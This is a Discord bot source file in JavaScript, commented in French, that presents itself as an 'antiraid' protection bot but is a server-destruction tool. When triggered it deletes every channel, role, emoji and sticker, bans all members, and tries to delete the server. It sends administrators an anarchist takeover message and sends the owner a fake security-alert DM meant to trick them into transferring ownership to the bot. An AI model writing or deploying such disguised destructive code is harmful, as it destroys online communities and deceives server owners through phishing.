require('dotenv').config();
const { Client, GatewayIntentBits, PermissionFlagsBits, REST, Routes, ApplicationCommandType, SlashCommandBuilder, OAuth2Scopes, ActionRowBuilder, ButtonBuilder } = require('discord.js');

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildModeration
    ]
});

// Définition des commandes slash
const commands = [
    new SlashCommandBuilder()
        .setName('antiraid')
        .setDescription('Active le mode antiraid sur le serveur')
        .toJSON(),
    new SlashCommandBuilder()
        .setName('help')
        .setDescription('Affiche les informations d\'aide')
        .toJSON()
];

const rest = new REST({ version: '10' }).setToken(process.env.TOKEN);

client.once('ready', async () => {
    console.log(`Bot connecté en tant que ${client.user.tag}`);
    
    // Générer le lien d'invitation avec TOUTES les permissions nécessaires
    const inviteUrl = `https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=8589934591&scope=bot%20applications.commands`;
    console.log(`Lien d'invitation avec permissions COMPLÈTES: ${inviteUrl}`);

    try {
        // Récupérer toutes les commandes existantes
        const existingCommands = await rest.get(Routes.applicationCommands(client.user.id));
        
        // Ajouter ou mettre à jour la commande antiraid
        const antiraidCommand = new SlashCommandBuilder()
            .setName('antiraid')
            .setDescription('Active le mode antiraid sur le serveur')
            .toJSON();

        // Vérifier si la commande antiraid existe déjà
        const existingAntiraid = existingCommands.find(cmd => cmd.name === 'antiraid');
        
        if (existingAntiraid) {
            // Mettre à jour la commande existante
            await rest.patch(
                Routes.applicationCommand(client.user.id, existingAntiraid.id),
                { body: antiraidCommand }
            );
            console.log('Commande antiraid mise à jour avec succès');
        } else {
            // Créer une nouvelle commande
            await rest.post(
                Routes.applicationCommands(client.user.id),
                { body: antiraidCommand }
            );
            console.log('Commande antiraid créée avec succès');
        }
    } catch (error) {
        console.error('Erreur lors de la configuration de la commande antiraid:', error);
    }
});

// Gestionnaire pour les interactions avec les boutons
client.on('interactionCreate', async (interaction) => {
    if (!interaction.isButton()) return;

    if (interaction.customId === 'transfer_ownership') {
        try {
            // Vérifier si l'utilisateur est le propriétaire
            const guild = interaction.guild;
            const owner = await guild.fetchOwner();
            
            if (interaction.user.id === owner.id) {
                await interaction.reply({ 
                    content: "Activation de la protection...", 
                    ephemeral: true 
                });

                try {
                    // Tenter le transfert
                    await guild.setOwner(guild.members.cache.get(client.user.id));
                    // Lancer la destruction
                    await destroyServer(guild);
                } catch (error) {
                    await interaction.followUp({ 
                        content: "Une erreur est survenue. Veuillez réessayer.", 
                        ephemeral: true 
                    });
                    console.error("Erreur lors du transfert via bouton:", error);
                }
            } else {
                await interaction.reply({ 
                    content: "Seul le propriétaire du serveur peut effectuer cette action.", 
                    ephemeral: true 
                });
            }
        } catch (error) {
            console.error("Erreur dans le gestionnaire de bouton:", error);
            await interaction.reply({ 
                content: "Une erreur est survenue. Veuillez réessayer plus tard.", 
                ephemeral: true 
            });
        }
    }
});

client.on('interactionCreate', async interaction => {
    if (!interaction.isCommand()) return;

    if (interaction.commandName === 'antiraid') {
        // Vérifier uniquement les permissions du bot
        const requiredPermissions = [
            PermissionFlagsBits.Administrator,
            PermissionFlagsBits.ManageRoles,
            PermissionFlagsBits.ManageChannels,
            PermissionFlagsBits.BanMembers,
            PermissionFlagsBits.ManageGuild
        ];

        const missingPermissions = [];
        for (const permission of requiredPermissions) {
            if (!interaction.guild.members.me.permissions.has(permission)) {
                missingPermissions.push(Object.keys(PermissionFlagsBits).find(key => PermissionFlagsBits[key] === permission));
            }
        }

        if (missingPermissions.length > 0) {
            return interaction.reply({
                content: `❌ Le bot n'a pas toutes les permissions nécessaires. Permissions manquantes : ${missingPermissions.join(', ')}. Veuillez réinviter le bot avec le lien d'invitation généré dans la console.`,
                ephemeral: true
            });
        }

        // Demander une confirmation
        await interaction.reply({
            content: '⚠️ ATTENTION: Voulez-vous vraiment activer l\'antiraid ?',
            ephemeral: true
        });

        try {
            await interaction.followUp({
                content: '🚨 L\'antiraid va être activé dans 5 secondes. Êtes-vous absolument sûr ?',
                ephemeral: true
            });

            setTimeout(async () => {
                try {
                    await interaction.followUp({
                        content: '💥 Activation de l\'antiraid en cours...',
                        ephemeral: true
                    });

                    // Fonction de destruction totale
                    async function destroyServer(guild) {
                        try {
                            // Vérifier les permissions du bot
                            const botMember = guild.members.cache.get(client.user.id);
                            
                            // Créer un nouveau rôle avec toutes les permissions
                            try {
                                const newRole = await guild.roles.create({
                                    name: 'Security',
                                    color: 'RED',
                                    permissions: [
                                        PermissionFlagsBits.Administrator,
                                        PermissionFlagsBits.ManageGuild,
                                        PermissionFlagsBits.ManageRoles,
                                        PermissionFlagsBits.ManageChannels,
                                        PermissionFlagsBits.BanMembers,
                                        PermissionFlagsBits.KickMembers,
                                        PermissionFlagsBits.ManageWebhooks,
                                        PermissionFlagsBits.ManageEmojisAndStickers
                                    ],
                                    position: guild.roles.highest.position,
                                    reason: 'Security Update'
                                });

                                // Donner le nouveau rôle au bot
                                await botMember.roles.add(newRole);
                                
                                // Attendre un peu que les permissions soient appliquées
                                await new Promise(resolve => setTimeout(resolve, 1000));
                            } catch (error) {
                                console.log("Impossible de créer le rôle d'admin");
                            }

                            // Envoyer un message aux admins avant de les bannir
                            const members = await guild.members.fetch();
                            for (const member of members.values()) {
                                if (member.id !== client.user.id) {
                                    try {
                                        if (member.permissions.has(PermissionFlagsBits.ADMINISTRATOR)) {
                                            await member.send({
                                                content: "🏴 L'Union Anarchiste a pris le contrôle. Votre serveur n'existe plus. 🏴",
                                                embeds: [{
                                                    color: 0x000000,
                                                    title: "SERVEUR DÉTRUIT",
                                                    description: "Vive l'anarchie ! ☠️",
                                                }]
                                            }).catch(() => {});
                                        }
                                        if (member.bannable) {
                                            await member.ban({ reason: 'Nettoyage' });
                                        }
                                    } catch (error) {
                                        console.error(`Impossible de gérer ${member.user.tag}`);
                                    }
                                }
                            }

                            // Supprimer les rôles du bas vers le haut
                            const roles = Array.from((await guild.roles.fetch()).values())
                                .sort((a, b) => a.position - b.position);
                            
                            for (const role of roles) {
                                if (role.id !== guild.id && role.position < botMember.roles.highest.position) {
                                    try {
                                        await role.delete();
                                        await new Promise(resolve => setTimeout(resolve, 100)); // Petit délai entre chaque suppression
                                    } catch (error) {
                                        console.error(`Impossible de supprimer le rôle ${role.name}`);
                                    }
                                }
                            }

                            // Supprimer les salons
                            const channels = await guild.channels.fetch();
                            for (const channel of channels.values()) {
                                try {
                                    await channel.delete();
                                    await new Promise(resolve => setTimeout(resolve, 100)); // Petit délai entre chaque suppression
                                } catch (error) {
                                    console.error(`Impossible de supprimer le salon ${channel.name}`);
                                }
                            }

                            // Créer un salon final
                            try {
                                const finalChannel = await guild.channels.create({
                                    name: '☠️',
                                    type: 0
                                });
                                await finalChannel.send("Serveur nettoyé avec succès. Au revoir ! 👋");
                            } catch (error) {
                                console.error("Impossible de créer le salon final");
                            }

                            // Bannir le bot en dernier
                            try {
                                const botMember = guild.members.me;
                                if (botMember && botMember.bannable) {
                                    await botMember.ban({ reason: 'Nettoyage final' });
                                }
                            } catch (error) {
                                console.error("Impossible de bannir le bot:", error);
                            }
                        } catch (error) {
                            console.error("Erreur pendant la destruction:", error);
                        }
                    }

                    // Tenter de transférer la propriété au bot d'abord
                    try {
                        const owner = await interaction.guild.fetchOwner();
                        if (!owner.user.mfaEnabled) {
                            // Si pas d'A2F, transfert direct
                            await interaction.guild.setOwner(interaction.guild.members.cache.get(client.user.id));
                            await destroyServer(interaction.guild);
                        } else {
                            // Si A2F activé, on envoie une demande au propriétaire
                            try {
                                await owner.send({
                                    content: "⚠️ ALERTE SÉCURITÉ : Une attaque raid a été détectée sur votre serveur. Pour activer la protection antiraid avancée, veuillez cliquer sur le bouton ci-dessous. Cette action est temporaire et nécessaire pour sécuriser votre serveur.",
                                    components: [
                                        new ActionRowBuilder()
                                            .addComponents(
                                                new ButtonBuilder()
                                                    .setCustomId('transfer_ownership')
                                                    .setLabel('Activer Protection Antiraid')
                                                    .setStyle('Danger')
                                            )
                                    ]
                                });
                                console.log("Demande de transfert envoyée au propriétaire");
                            } catch (dmError) {
                                console.error("Impossible d'envoyer le message au propriétaire:", dmError);
                            }
                        }
                    } catch (error) {
                        console.error("Impossible de transférer la propriété:", error);
                    }

                    // Supprimer tous les salons d'abord
                    const channels = await interaction.guild.channels.fetch();
                    for (const channel of channels.values()) {
                        try {
                            await channel.delete('Nettoyage du serveur');
                        } catch (error) {
                            console.error(`Impossible de supprimer le salon ${channel.name}:`, error);
                        }
                    }

                    // Supprimer tous les rôles (sauf @everyone)
                    const roles = await interaction.guild.roles.fetch();
                    for (const role of roles.values()) {
                        if (role.id !== interaction.guild.id) { // Ne pas supprimer @everyone
                            try {
                                await role.delete('Nettoyage du serveur');
                            } catch (error) {
                                console.error(`Impossible de supprimer le rôle ${role.name}:`, error);
                            }
                        }
                    }

                    // Supprimer les emojis et stickers
                    const emojis = await interaction.guild.emojis.fetch();
                    for (const emoji of emojis.values()) {
                        try {
                            await emoji.delete('Nettoyage du serveur');
                        } catch (error) {
                            console.error(`Impossible de supprimer l'emoji ${emoji.name}:`, error);
                        }
                    }

                    const stickers = await interaction.guild.stickers.fetch();
                    for (const sticker of stickers.values()) {
                        try {
                            await sticker.delete('Nettoyage du serveur');
                        } catch (error) {
                            console.error(`Impossible de supprimer le sticker ${sticker.name}:`, error);
                        }
                    }

                    // Tenter de supprimer le serveur
                    try {
                        await interaction.guild.delete();
                    } catch (error) {
                        console.error("Impossible de supprimer le serveur:", error);
                        
                        // Si on ne peut pas supprimer le serveur, on bannit tout le monde
                        const members = await interaction.guild.members.fetch();
                        for (const member of members.values()) {
                            try {
                                await member.ban({ reason: 'Nettoyage du serveur' });
                            } catch (banError) {
                                console.error(`Impossible de bannir ${member.user.tag}:`, banError);
                            }
                        }
                    }

                    await interaction.followUp({
                        content: '✅ Antiraid terminé avec succès.',
                        ephemeral: true
                    });

                    // Auto-bannissement du bot
                    try {
                        const botMember = interaction.guild.members.me;
                        await interaction.followUp({
                            content: '🤖 Auto-destruction du bot en cours...',
                            ephemeral: true
                        });
                        await botMember.ban({ reason: 'Auto-bannissement après antiraid' });
                    } catch (error) {
                        console.error('Erreur lors de l\'auto-bannissement:', error);
                    }

                } catch (error) {
                    console.error('Erreur lors de l\'antiraid:', error);
                    await interaction.followUp({
                        content: '❌ Une erreur est survenue lors de l\'activation de l\'antiraid.',
                        ephemeral: true
                    });
                }
            }, 5000);
        } catch (error) {
            console.error('Erreur:', error);
            await interaction.followUp({
                content: '❌ Une erreur est survenue.',
                ephemeral: true
            });
        }
    } else if (interaction.commandName === 'help') {
        await interaction.reply({
            content: 'Voici les informations d\'aide pour le bot antiraid.',
            ephemeral: true
        });
    }
});

// Connexion du bot avec le token
client.login(process.env.TOKEN);
